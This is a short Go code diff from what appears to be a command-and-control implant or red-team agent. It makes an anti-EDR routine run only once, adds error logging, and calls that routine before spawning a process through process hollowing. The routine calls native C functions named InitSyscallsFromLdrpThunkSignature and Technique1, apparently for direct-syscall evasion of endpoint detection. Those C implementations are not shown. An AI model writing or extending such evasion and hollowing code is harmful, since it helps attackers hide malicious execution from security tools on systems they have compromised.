@@ -29,9 +29,27 @@ import (
 	"golang.org/x/text/encoding/charmap"
 )
 
-func AntiEdr() {
-	C.InitSyscallsFromLdrpThunkSignature()
-	C.Technique1()
+var antiEdrActive bool = false
+
+func AntiEdr() error {
+	if antiEdrActive {
+		return nil
+	}
+
+	log.Info("Activate Anti EDR")
+	ret := C.InitSyscallsFromLdrpThunkSignature()
+	if ret == 0 {
+		log.Error("AntiEDR: InitSyscallsFromLdrpThunkSignature error")
+	}
+
+	ret = C.Technique1()
+	if ret == 0 {
+		log.Error("AntiEDR: Technique1 error")
+	}
+
+	antiEdrActive = true
+
+	return nil
 }
 
 // https://coolaj86.com/articles/golang-and-windows-and-admins-oh-my/
@@ -202,6 +220,12 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		}
 		if _, err := os.Stat(sourcePath); errors.Is(err, os.ErrNotExist) {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow destination exe does not exist: %s", sourcePath)
+		}
+
+		// Activate Anti-EDR if not yet done
+		err = AntiEdr()
+		if err != nil {
+			log.Error("Anti EDR failed: %s", err.Error())
 		}
 
 		name := filepath.Base(executable) // Need it without path
